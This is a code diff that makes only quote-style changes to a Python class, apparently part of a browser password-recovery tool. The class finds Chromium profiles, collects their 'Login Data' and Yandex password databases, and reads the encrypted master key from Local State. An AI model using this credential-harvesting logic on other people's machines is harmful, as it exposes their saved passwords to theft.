@@ -26,7 +26,7 @@ class ChromiumBased:
         databases = set()
 
         # Empty string means current dir, without a profile
-        profiles = {'Default', ''}
+        profiles = {"Default", ""}
 
         for f in os.listdir(self.user_data_path):
             f_path = os.path.join(self.user_data_path, f)
@@ -34,10 +34,10 @@ class ChromiumBased:
                 profiles.add(f)
 
         # Add profiles from Local State
-        with open(self.local_state_path, 'r', encoding='utf-8') as f:
+        with open(self.local_state_path, "r", encoding="utf-8") as f:
             try:
                 data = json.load(f)
-                profiles |= set(data['profile']['info_cache'])
+                profiles |= set(data["profile"]["info_cache"])
             except:
                 pass
 
@@ -47,7 +47,7 @@ class ChromiumBased:
             except:
                 continue
             for db in files:
-                if db.lower() in ['login data', 'ya passman data']:
+                if db.lower() in ("login data", "ya passman data"):
                     databases.add(os.path.join(self.user_data_path, profile, db))
 
         return databases
@@ -88,9 +88,9 @@ class ChromiumBased:
         return credentials
 
     def _get_key(self):
-        with open(self.local_state_path, 'r', encoding='utf-8') as f:
+        with open(self.local_state_path, "r", encoding="utf-8") as f:
             data = json.load(f)
-            encrypted_key = data['os_crypt']['encrypted_key']
+            encrypted_key = data["os_crypt"]["encrypted_key"]
 
         encrypted_key = base64.b64decode(encrypted_key)
 
